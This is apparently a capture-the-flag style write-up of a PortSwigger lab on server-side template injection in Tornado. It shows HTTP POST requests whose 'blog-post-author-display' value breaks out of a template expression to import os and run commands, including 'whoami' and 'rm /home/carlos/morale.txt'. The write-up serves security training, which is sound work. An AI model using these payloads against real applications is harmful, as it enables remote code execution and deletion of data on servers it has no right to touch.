
# Basic server-side template injection (code context)

This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

Hint: Take a closer look at the "preferred name" functionality.


---------------------------------------------

References: 

- https://portswigger.net/web-security/server-side-template-injection/exploiting




![img](images/Basic%20server-side%20template%20injection%20(code%20context)/1.png)

---------------------------------------------

It is possible to update the email and set a preferred name:





![img](images/Basic%20server-side%20template%20injection%20(code%20context)/2.png)
![img](images/Basic%20server-side%20template%20injection%20(code%20context)/3.png)


If you change it to the nickname, in the comments you see H0td0g:



![img](images/Basic%20server-side%20template%20injection%20(code%20context)/4.png)


```
POST /my-account/change-blog-post-author-display HTTP/2
...

blog-post-author-display=user.nickname}}{{2*2}}&csrf=PdLe58H5wvdQEv1PtPmQOJMvRz3krZgs
```





![img](images/Basic%20server-side%20template%20injection%20(code%20context)/5.png)
![img](images/Basic%20server-side%20template%20injection%20(code%20context)/6.png)


```
POST /my-account/change-blog-post-author-display HTTP/2
...

blog-post-author-display=user.nickname}}{%+import+os+%}{{os.popen("whoami").read()}}&csrf=PdLe58H5wvdQEv1PtPmQOJMvRz3krZgs
```





![img](images/Basic%20server-side%20template%20injection%20(code%20context)/7.png)
![img](images/Basic%20server-side%20template%20injection%20(code%20context)/8.png)


``` 
POST /my-account/change-blog-post-author-display HTTP/2
...

blog-post-author-display=user.nickname}}{%+import+os+%}{{os.popen("rm+/home/carlos/morale.txt").read()}}&csrf=PdLe58H5wvdQEv1PtPmQOJMvRz3krZgs
```



![img](images/Basic%20server-side%20template%20injection%20(code%20context)/9.png)